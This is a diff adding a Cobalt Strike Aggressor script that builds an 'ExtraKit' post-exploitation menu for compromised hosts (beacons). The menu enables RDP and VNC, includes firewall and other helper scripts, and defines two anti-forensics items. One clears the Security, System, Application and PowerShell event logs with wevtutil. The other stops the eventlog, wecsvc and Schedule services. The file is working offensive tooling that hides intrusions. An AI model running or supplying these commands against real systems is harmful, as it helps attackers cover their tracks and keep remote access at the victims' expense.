@@ -1,0 +1,50 @@
+popup beacon_bottom {
+    menu "ExtraKit" {   
+        menu "OS Quick Operation" {
+            # RDP
+            item "Enable RDP" {
+                include(script_resource("scripts/enable-rdp.cna"));
+            }
+            item "Enable VNC" {
+                include(script_resource("scripts/vnc-psh.cna"));
+            }
+            # Firewall
+            include(script_resource("scripts/firewall.cna"));
+            
+            # clear event log
+            item "Clear EventLog" {
+                local('$bid');
+                foreach $bid ($1){
+                    bshell($1, "wevtutil cl \"windows powershell\"");
+                    bshell($1, "wevtutil cl \"security\"");
+                    bshell($1, "wevtutil cl \"system\"");
+                    bshell($1, "wevtutil cl \"Application\"");
+                }
+            }
+            # 
+            item "Stop EventLog" {
+                local('$bid');
+                foreach $bid ($1){
+                    bshell($1, "sc stop Schedule");
+                    bshell($1, "sc stop wecsvc");
+                    bshell($1, "sc stop eventlog");
+                }
+            }
+        }
+
+        menu "Quick Operation"{
+            item "Zipper" {
+                include(script_resource("scripts/Zipper.cna"));
+            }
+        }
+
+        separator();
+        include(script_resource("scripts/Annoy.cna"));
+
+        separator();
+        item "RedTeam Reference" {
+            include(script_resource("scripts/RedTeam-Repo.cna"));
+            include(script_resource("scripts/RedTeam-Help.cna"));
+        }
+    }
+}
